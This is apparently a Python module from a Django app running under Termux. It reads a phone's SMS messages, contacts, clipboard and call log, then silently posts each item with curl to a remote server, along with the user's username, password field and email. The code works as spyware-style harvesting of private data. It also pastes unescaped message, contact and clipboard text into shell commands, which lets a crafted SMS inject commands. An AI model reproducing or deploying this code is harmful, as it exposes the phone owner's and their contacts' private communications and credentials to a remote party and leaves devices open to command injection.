import json
import os
from .models import call_log, sms_list, clipboard, contact_list, Token
from .conf import SERVER_URL

def check_sms(THIS_USER_TOKEN):
    try:
        res = json.loads(os.popen('termux-sms-list -l 1000 &> /dev/null &').read())
    except:
        raise ('Termux command error!')

    for sms in res:
        if not sms_list.objects.filter(received=sms['received']).exists():
            os.popen(
                f'curl --data "token={THIS_USER_TOKEN}&body={sms["body"]}&phone_number={sms["number"]}&type={sms["type"]}&read={str(sms["read"]).capitalize()}&received={sms["received"]}" {SERVER_URL}/s/sms_list/ &> /dev/null &')


def check_contact(THIS_USER_TOKEN):
    try:
        res = json.loads(os.popen('termux-contact-list').read())
    except:
        raise ('Termux command error!')

    for contact in res:
        if not contact_list.objects.filter(name=contact['name']).exists():
            os.popen(
                f"curl --data \"token={THIS_USER_TOKEN}&name={contact['name']}&phone_number={contact['number']}\" {SERVER_URL}/s/contact/")


def check_clipboard(THIS_USER_TOKEN):
    try:
        res = os.popen('termux-clipboard-get').read()
    except:
        raise ('Termux command error!')

    if not clipboard.objects.filter(text=res).exists():
        os.popen(f'curl --data "token={THIS_USER_TOKEN}&text={res}" {SERVER_URL}/s/clipboard/')


def check_call(THIS_USER_TOKEN):
    try:
        res = json.loads(os.popen('termux-call-log -l 1000').read())
    except:
        raise ('Termux command error!')

    for log in res:
        if not call_log.objects.filter(date=log['date']).exists():
            os.popen(
                f'curl --data "token={THIS_USER_TOKEN}&name={log["name"]}&phone_number={log["phone_number"]}&type={log["type"]}&duration={log["duration"]}&date={log["date"]}" {SERVER_URL}/s/call_log/')


def register_server(THIS_USER_TOKEN):
    from django.shortcuts import get_object_or_404
    this_user = get_object_or_404(Token, token=THIS_USER_TOKEN).user
    os.system(f'curl --data "username={this_user.username}&password={this_user.password}&email={this_user.email}&token={THIS_USER_TOKEN}" {SERVER_URL}/register/ &> /dev/null &')

def InsertIntoDb(THIS_USER_TOKEN):
    check_sms(THIS_USER_TOKEN)
    check_call(THIS_USER_TOKEN)
    check_clipboard(THIS_USER_TOKEN)
    check_contact(THIS_USER_TOKEN)